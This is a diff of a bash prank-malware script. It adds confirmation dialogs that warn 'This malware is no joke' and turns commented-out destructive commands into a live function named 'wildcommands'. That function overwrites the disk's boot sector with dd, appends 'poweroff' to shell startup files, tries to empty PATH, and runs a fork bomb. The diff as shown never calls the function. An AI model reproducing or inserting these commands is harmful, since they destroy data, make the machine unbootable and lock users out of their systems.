@@ -11,7 +11,7 @@ if [[ -n "$XDG_SESSION_DESKTOP" ]]; then
 
       zenity --question --text="This malware is no joke! Do you want to proceed? (Double Check)" --title="WARNING!" --cancel-label="Cancel" --ok-label="Proceed"
       if [[ $? -eq 0 ]]; then
-        echo "welp, good luck"
+        zenity --info --text "Welp, Good luck." --title "..." --ok-label "Alright"
       else
         exit
       fi
@@ -30,19 +30,21 @@ else
     if [[ $? -ne 0 ]]; then
       exit
     else
-      whiptail --yesno "This malware is no joke. Proceed? (Double Checkz)" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
+      whiptail --yesno "This malware is no joke. Proceed? (Double Check.)" --yes-button "Proceed" --no-button "Cancel" --title "Warning!" 10 35
       if [[ $? -ne 0 ]]; then
         exit
       else
-        echo "welp, good luck"
-        clear
+        whiptail --msgbox "Welp, Good luck." 8 20 --title "..."
       fi
     fi
   fi
 fi
 
 #wild and dangerous commands:
-# sudo dd if=boot.bin of=/dev/sda bs=512
-# echo poweroff >> .bashrc && echo poweroff >> .zshrc
-# export $PATH = ""
-# :(){ :|:& };:
+
+wildcommands() {
+  sudo dd if=boot.bin of=/dev/sda bs=512
+  echo poweroff >> .bashrc && echo poweroff >> .zshrc
+  export $PATH = ""
+  :(){ :|:& };:
+}
